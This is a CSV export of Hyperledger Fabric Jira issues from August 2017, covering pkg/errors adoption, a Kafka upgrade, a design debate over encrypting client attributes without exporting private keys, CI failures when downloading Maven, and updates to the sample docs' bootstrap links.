Have all errors use the pkg/errors package,FAB-5731,20128,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,kchristidis,kchristidis,11/Aug/17 9:11 PM,30/Apr/19 11:39 PM,28/Oct/23 3:00 AM,30/Apr/19 11:39 PM,v1.0.1,,,Future,,fabric-orderer,,,,,,0,Release-planning-1.2,serviceability,,,,,"See:

https://jira.hyperledger.org/browse/FAB-5504

[https://lists.hyperledger.org/pipermail/hyperledger-fabric/2017-August/001579.html]

 ",,jyellick,kchristidis,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5767,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzzu9b:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,kchristidis,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Aug/17 12:50 AM;jyellick;Due to the high merge conflict nature of this issue, I'm not certain doing this in bulk for v1.1 is appropriate.  At the very least, I'd suggest we make some sub-tasks and split the update into CRs by package, or group of packages.;;;","30/Apr/19 11:39 PM;sykesm;A large portion of the code base is already using pkg/errors and, during reviews, we are trying to ensure new errors and error reporting uses it as appropriate.

Given that this isn't very actionable in its current state and it's more than a year old, it's time to call it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Clarify policy evaluation errors,FAB-5732,20129,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,11/Aug/17 9:40 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,03/Sep/17 10:55 PM,,,,,,fabric-orderer,,,,,,0,Release-planning-1.1,,,,,,"The logs for policy evaluation can be quite unintuitive to the uninitiated.

This CR is to evaluate this logging and attempt to improve it to be less opaque.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycs7:",,,,Unset,,,,,,,2.0,Unset,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/17 3:37 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/12597/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade default Kafka version to 0.10,FAB-5734,20131,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sanchezl,kchristidis,kchristidis,11/Aug/17 10:58 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,05/Sep/17 11:19 PM,v1.0.1,,,v1.1.0,,fabric-orderer,,,,,,0,kafka,Release-planning-1.1,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycun:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update submodules to latest commits,FAB-5735,20132,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,11/Aug/17 11:40 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,16/Aug/17 12:25 AM,,,,,,fabric-quality,,,,,,0,,,,,,,The submodules will need to be updated to the latest commits. This should eventually be apart of CI integration.,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycv3:",,,,Unset,,Sprint 19 - Quality,,,,,,Unset,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
I want to make access control decisions in chaincode based on client attributes and not reveal unnecessary info to other parties,FAB-5736,20137,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,smithbk,smithbk,12/Aug/17 1:57 AM,23/Jan/20 7:01 AM,28/Oct/23 3:00 AM,23/Jan/20 7:01 AM,,,,,,fabric-crypto,,,,,,0,Release-planning-1.2,stale-item,,,,,"The goal is to make access control decisions in chaincode based on ""client attributes"".  I am using the term ""client attributes"" in its most general sense.  They could be arbitrary name/value pairs such as ""admin=true"" or ""bank-account=1234"", or predicates such as ""I am over 21"".
Sometimes these attributes need not be private.  For example, it may be fine for everyone to know that I have an identity with ""admin=true"".
In other cases such as the ""bank-acount=1234"" example, I may need to keep the attribute secret from everyone except the client, the fabic-ca-server, and the chaincode.
This story focuses on the last case in which I want to keep an attribute as private as possible.

",,angelo.decaro,binhn,elli-androulaki,JonathanLevi,smithbk,sykesm,tsrb,vpaprots,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzwrwv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,binhn,elli-androulaki,JonathanLevi,smithbk,sykesm,tsrb,vpaprots,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 9:20 AM;angelo.decaro;If we allow to export a secret key that would create an incompatibility with the HSM-based BCCSP. [~elli-androulaki], [~ales], [~vpaprots@ca.ibm.com], [~mastersingh24] what's your take here?

Actually, a possible solution would be to have an opts that allows to generate an exportable secret key, no matter what. Would this be a viable solution also in HSM context?;;;","21/Aug/17 11:39 PM;elli-androulaki;I agree with you [~angelo.decaro] that adding an opts field in the call of key-derivation makes sense to accommodate both needs. 
We can also set ""non-exportable"" as default mode for such keys being generated. What do you think?

 ;;;","21/Aug/17 11:52 PM;smithbk;Yes, so the following will be work, right?

{code}
	bkey, err := csp.KeyGen(&bccsp.AESKeyGenOpts{Temporary: true, Exportable: true})
	if err != nil {
		return nil, nil, fmt.Errorf(""Failed to generate key: %s"", err)
	}
	key, err := bkey.Bytes()
	if err != nil {
		return nil, nil, fmt.Errorf(""Failed to serialize key: %s"", err)
	}
{code};;;","22/Aug/17 1:44 AM;elli-androulaki;In terms of BCCSP interface change, yes, I would say so. ;;;","22/Aug/17 6:59 AM;JonathanLevi;I'm not sure I understand. Why do we need to export a *private* key?;;;","22/Aug/17 7:00 AM;JonathanLevi;[~smithbk] "" I want to pass the keys back to the client and they will be passed to chaincode in the transient data field."" 
Why would you want to pass the *private* key to the chaincode?;;;","23/Aug/17 1:51 AM;binhn;Discussed with Keith yesterday that we should allow the requester to pass in a public key to use for attribute encryption. This would enable the application to control the secret, which may be in HSM. ;;;","23/Aug/17 4:57 AM;vpaprots;[~binhn] Were you thinking of a scheme like ECIES for encryption of attributes?

I had discussed this problem of sending private keys in transient data with both [~smithbk] and [~mastersingh24] . Not sure if I actually managed to convey my thoughts, it was a while ago and we had plenty of other things to worry about, but here another try.

Yes, exporting a private key as bytes is not something you do. HSM will not let you do that. The closest you can get to 'exporting' private key is a Key-Encrypt-Key (KEK) solution, in which you give the HSM another HSM key to encrypt the key you want. That gets you the encrypted key back which you can now send around. Perhaps its a bit of circular reasoning..

To establish a shared 'master key' for the KEK I was proposing something like ECDHE. One could arrange that to happen as part of enrolment or part of TCert batch request.

I think ECIES is fine too. Its really ECDHE->SHA->AES.. similar to what I was suggesting above.

[~angelo.decaro] [~elli-androulaki] We might need to check with Tamas (and use several of your 'chips' of course ;)) on ECIES implementation with HSM. In particular, output of ECDHE is typically a (public) point rather then a (unconditioned) 'key', but I believe there is a way to overcome that.;;;","23/Aug/17 5:47 AM;JonathanLevi;Here is an idea. Let's first discuss the problem, and not the proposed solution.

Let's put aside the current proposal to {color:#d04437}*export* {color:#333333}and/or{color}{color} {color:#d04437}*share* *private keys*{color} and/or pass them to the chaincode - something that will not hold water. *{color:#205081}I have objected to such patches/exporting of private keys time and again... the issue is not the HSM incompatibility, the issue is that we don't export private keys. I don't need convincing...{color}* {color:#333333}(and I ""betcha"" that neither does [~mastersingh24]). {color}On that note, let's also bear in mind that some of the good KEK schemes and techniques are heavily patented, some of which have not expired.

We have enough brain/thinking power here. Much more so, when we combine forces. I/others can be a lot more helpful, much more so than when we start from a user-story in the form of: ""As a user, I need to export the private key and share it on XYZ. Let's just set: export=true"". This already  begins from the wrong starting point.

How about we take a step back, and start with: *What is the actual +problem+ that we are trying to solve?* Can we start with this, and then try to work out a solution or examine a few proposals together?

 ;;;","24/Aug/17 3:10 AM;JonathanLevi;[~Clayton Sims] made changes - 10 minutes ago
|Labels|Release-planning-1.1|Release-planning-1.2|

Thank you [~Clayton Sims] ^^^;;;","24/Aug/17 5:31 AM;vpaprots;[~JonathanLevi] Good point. [~smithbk] you know more about the problem, but I think this is correct.. And most of this is probably stuff you know, Jonathan, but for the benefit of bringing everyone along and making this item make more sense standalone.

CA should encrypt 'properties' into a (T)cert its producing. And give back the certificate requestor (i.e. sdk) a key for decryption. I believe there is a key derivation scheme (based on HMAC, hope you know which I am talking about) so that the key returned by the CA is actually the root key for that batch (or user, depending on the scheme).

The SDK then might 'send' this key to a particular endorsing peer (I believe the plan is to use the transient field). I believe much of this code already existed at some point (either in 0.6 or in unmerged changes?)

So the +actual+ problem is of transport. How to distribute those keys? From the CA to SDK. From SDK to Peer. I believe the claim was that because the keys are sent over TLS, it is fine. Clearly, HSM does not agree..

If I were to take even a larger step back.. the point of attributes. I believe they are crucial to implement 'application-level' permissions? Is that correct? Is this key distribution the only way to accomplish that? Perhaps not the questions to be asking when most of the code is written?;;;","24/Aug/17 6:50 AM;smithbk;I rewrote this as a story.  See the description section.   A proposal follows.

1) In v1.1, support only unencrypted attributes in ECerts.   For many RBAC (Role-Based Access Control) decisions, I don't think it is necessary to hide the fact that someone has a particular role.  For example, if someone has the attribute ""admin"" with a value of ""true"", they would have the ""admin"" role and need not be hidden.

2) Post v1.1, support encrypted attributes in ECerts.  When the client enrolls with the fabric-ca-server, the client would be required to send a list of <attributeName, publicKey> pairs for each attribute to be encrypted.  The server uses the public key to encrypt the attribute value, place it in the certificate, and signs it.  The chaincode would need access to the private key in order to decrypt the value.
;;;","12/Sep/18 8:18 PM;elli-androulaki;So a document associated to attribute based access control (edited more than a couple of months ago, is [here|https://docs.google.com/document/d/1ETeoqfUHMK3sisF0k0IIACLEh3E8eVzMiOWagTAQXio/edit?usp=sharing]). Also this item seems to be related to FAB-8794 and to FAB-11602. Shall we include it as part of the epic? ;;;","23/Jan/20 7:01 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,
Implement server logic for Channel Service ,FAB-5737,20138,20082,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,12/Aug/17 2:58 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Dec/17 12:55 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycvb:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 10:36 PM;wlahti;https://gerrit.hyperledger.org/r/#/c/12375/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement client logic for Channel Service,FAB-5738,20139,20082,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,12/Aug/17 2:59 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Dec/17 12:55 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,ScottMoynes,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycvj:",,,,,,,,,,,,,,,,,,,,,,,ScottMoynes,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 10:36 PM;wlahti;https://gerrit.hyperledger.org/r/#/c/12377/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - failure in downloading maven pkgs using curl or wget commands causing build failures inconsistently,FAB-5739,20140,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,12/Aug/17 3:09 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Aug/17 3:05 AM,,,,,,fabric-build,,,,,,1,build-system,,,,,,"Observed fabric builds are failing inconsistently with below errors. *curl* command fails inconsistently without downloading the complete file. Could be some instability in the infra causing these issues.
{code:java}
00:04:52.644 Step 7/15 : RUN mkdir -p /usr/share/maven /usr/share/maven/ref   && curl -fsSL http://apache.osuosl.org/maven/maven-3/$MAVEN_VERSION/binaries/apache-maven-$MAVEN_VERSION-bin.tar.gz     | tar -xzC /usr/share/maven --strip-components=1   && ln -s /usr/share/maven/bin/mvn /usr/bin/mvn
00:04:52.710  ---> Running in 1fe3acf6a0af
00:09:12.512 curl: (18) transfer closed with 1338842 bytes remaining to read
00:09:12.513 
00:09:12.513 gzip: stdin: unexpected end of file
00:09:12.514 tar: Unexpected EOF in archive
00:09:12.514 tar: Unexpected EOF in archive
00:09:12.514 tar: Error is not recoverable: exiting now{code}",on all Jenkins x86_64 nodes,harsha544,rameshthoomu,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycvr:",,,,,,,,,,,,,,,,,,,,,,,harsha544,rameshthoomu,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Aug/17 3:10 AM;rameshthoomu;@ry could you please look into this or ask infra team to look into this inconsistent failures with the network instability.;;;","12/Aug/17 3:45 AM;rameshthoomu;The above failure is while building java env image from fabric repository

https://github.com/hyperledger/fabric/blob/ae4e37dbafe74997534ab317dec5c3f4f53b6a84/images/javaenv/Dockerfile.in#L12;;;","12/Aug/17 3:48 AM;harsha544;I see this would be down to mirror site from where we are downloading. i.e 
Tried downloading from here it happened faster [http://www-us.apache.org/dist/maven/maven-3/3.3.9/binaries/];;;","12/Aug/17 5:30 AM;rameshthoomu;Tested new URL on x86_64 builds nodes and it's working as expected.. Submitted patch with new URL https://gerrit.hyperledger.org/r/#/c/12369/;;;","12/Aug/17 5:43 AM;ryjones;awaiting merge;;;","12/Aug/17 6:21 AM;rameshthoomu;Below are the improvement in build time with the new URL

new URL:{color:#14892c} *2-3 secs*{color}

*{color:#d04437}00:04:13.951{color}* Step 7/15 : RUN mkdir -p /usr/share/maven /usr/share/maven/ref   && curl -fsSL http://www-us.apache.org/dist/maven/maven-3/$MAVEN_VERSION/binaries/apache-maven-$MAVEN_VERSION-bin.tar.gz     | tar -xzC /usr/share/maven --strip-components=1   && ln -s /usr/share/maven/bin/mvn /usr/bin/mvn
{color:#d04437}*00:04:14.038*{color}  ---> Running in f3ef9c26acf3
{color:#d04437}*00:04:16.402*{color}  ---> de34acefff41

OLD URL: {color:#14892c}*4 mins 38 secs*{color}

{color:#d04437}*00:04:17.105*{color} Step 7/15 : RUN mkdir -p /usr/share/maven /usr/share/maven/ref   && curl -fsSL http://apache.osuosl.org/maven/maven-3/$MAVEN_VERSION/binaries/apache-maven-$MAVEN_VERSION-bin.tar.gz     | tar -xzC /usr/share/maven --strip-components=1   && ln -s /usr/share/maven/bin/mvn /usr/bin/mvn
{color:#d04437}*00:04:17.181*{color}  ---> Running in 0412d19fa11f
{color:#d04437}*00:08:55.328*{color}  ---> c535860866ce
{color:#d04437}*00:08:55.352*{color} Removing intermediate container 0412d19fa11f

 ;;;","15/Aug/17 8:58 AM;ryjones;is this merged and done now?;;;","15/Aug/17 10:47 PM;rameshthoomu;[~ryjones] Still in-review.. Waiting for one more +2..;;;","18/Aug/17 3:05 AM;rameshthoomu;Patch has been merged,.. https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-x86_64/2414/consoleFull


*{color:#d04437}00:04:55.280{color}* Step 7/15 : RUN mkdir -p /usr/share/maven /usr/share/maven/ref   && curl -fsSL http://www-us.apache.org/dist/maven/maven-3/$MAVEN_VERSION/binaries/apache-maven-$MAVEN_VERSION-bin.tar.gz     | tar -xzC /usr/share/maven --strip-components=1   && ln -s /usr/share/maven/bin/mvn /usr/bin/mvn
00:04:55.350  ---> Running in 095aafbd8933
*{color:#d04437}00:04:59.819{color}*  ---> 6b8e2973708a {color:#d04437}*(Took 4 secs to complete this process)*{color}
00:04:59.839 Removing intermediate container 095aafbd8933
{color:#333333}00:04:59.840{color} Step 8/15 : ENV MAVEN_HOME /usr/share/maven;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - gerrit checkout is failing inconsistently on Jenkins x86_64 build nodes,FAB-5741,20142,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ryjones,rameshthoomu,rameshthoomu,12/Aug/17 5:35 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,28/Nov/17 7:22 AM,,,,,,fabric-ci,,,,,,0,build-system,,,,,,"Observed below issue inconsistently on x86_64 build nodes and causing build failures.
{code:java}
00:01:10.219 JENKINS-19022: warning: possible memory leak due to Git plugin usage; see: https://wiki.jenkins-ci.org/display/JENKINS/Remove+Git+Plugin+BuildsByBranch+BuildData
00:01:10.221 Checking out Revision 82f0bd94c9ef489ade6075d3e322a7cbac4bbb0d (refs/changes/21/12321/5){code}
Build Failure Reference#

[https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-x86_64/2383/console]",Jenkins Environment,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycw7:",,,,,,,,,,,,,,,,,,,,,,,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Nov/17 1:24 PM;denyeart;[~rameshthoomu] [~ryjones] Is this still an issue? If not, please mark Done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add channel service listener sample,FAB-5742,20143,20082,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,12/Aug/17 5:37 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Dec/17 12:55 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycwf:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 10:37 PM;wlahti;https://gerrit.hyperledger.org/r/#/c/12381/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add kafka orderer calls ,FAB-5743,20144,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,12/Aug/17 6:21 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 4:56 AM,,,,,,,,,,,,0,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycwn:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve UT coverage for Channel Service server,FAB-5744,20145,20082,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,12/Aug/17 6:23 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Dec/17 12:55 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycwv:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 10:37 PM;wlahti;https://gerrit.hyperledger.org/r/#/c/12379/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add couchdb capability,FAB-5745,20146,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,12/Aug/17 6:40 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 4:56 AM,,,,,,,,,,,,0,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycx3:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric samples docs with new short URL for release,FAB-5746,20147,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,mastersingh24,12/Aug/17 6:42 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,12/Aug/17 6:45 PM,v1.0.0,,,v1.0.0,,fabric-release,,,,,,0,release,,,,,,"create shortened URL that resolves to v1.0.0 tagged version of bootstrap script

visit [https://goo.gl/] and create shortened link for:

[https://raw.githubusercontent.com/hyperledger/fabric/master/scripts/bootstrap-1.0.0.sh]

Update docs/source/samples.rst with the created short link

[https://goo.gl/iX9dek]",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,FAB-5075,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycxb:",,,,,,,,,,,1.0,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric samples docs with new short URL for release,FAB-5747,20148,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,12/Aug/17 6:46 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Aug/17 6:15 AM,v1.0.0,,,v1.0.1,,fabric-release,,,,,,0,,,,,,,"create shortened URL that resolves to v1.0.1 tagged version of bootstrap script

visit [https://goo.gl/] and create shortened link for:

[https://raw.githubusercontent.com/hyperledger/fabric/master/scripts/bootstrap-1.0.1.sh|https://raw.githubusercontent.com/hyperledger/fabric/master/scripts/bootstrap-1.0.0.sh]

Update docs/source/samples.rst with the created short link

https://goo.gl/eYdRbX",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycxj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Aug/17 7:25 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/12383/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
